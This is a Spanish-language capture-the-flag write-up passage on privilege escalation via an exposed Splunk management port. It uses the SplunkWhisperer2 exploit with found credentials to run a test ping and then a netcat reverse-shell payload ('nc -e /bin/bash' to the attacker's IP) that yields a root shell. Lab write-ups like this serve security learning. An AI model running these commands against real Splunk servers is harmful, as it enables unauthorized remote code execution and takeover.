## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
cd /
ls -l
cd /opt
```

Aqui vemos un directory splunkforward. Nos hace pensar que teniamos un puerto 8089 abierto con un splunkd.
Si vamos a esta url `https://10.10.10.209:8089` vemos un servicio splunkd.

Aqui podemos tirar de un exploit en el github de [cnotin](https://github.com/cnotin/SplunkWhisperer2) que permite hacer un
Local o un Remote privilege escalation. En este caso utilizaremos el Remoto.

```bash
git clone https://github.com/cnotin/SplunkWhisperer2
cd SplunkWhisperer2
ls
python3 PySplunkWhisperer2_remote.py
```

aqui vemos como se utiliza. Intentamos primeramente enviar una traza ICMP a nuestra maquina para ver si funcciona.

1. Nos ponemos en escucha por traza ICMP

    ```bash
    tcpdump -i tun0 icmp -n
    ```

1. lanzamos el exploit para enviar una traza ICMP

    ```bash
    python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.7 --username shaun --password Guitar123 --payload "ping -c 1 10.10.14.7"
    ```

Vemos que recibimos la traza. Ahora nos mandamos una reverse shell

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. lanzamos el exploit para entablar una reverse shell

    ```bash
    python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.7 --username shaun --password Guitar123 --payload "nc.traditional -e /bin/bash 10.10.14.7 443"
    ```

La conneccion esta entablada.

```bash
whoami
#Output
root
```
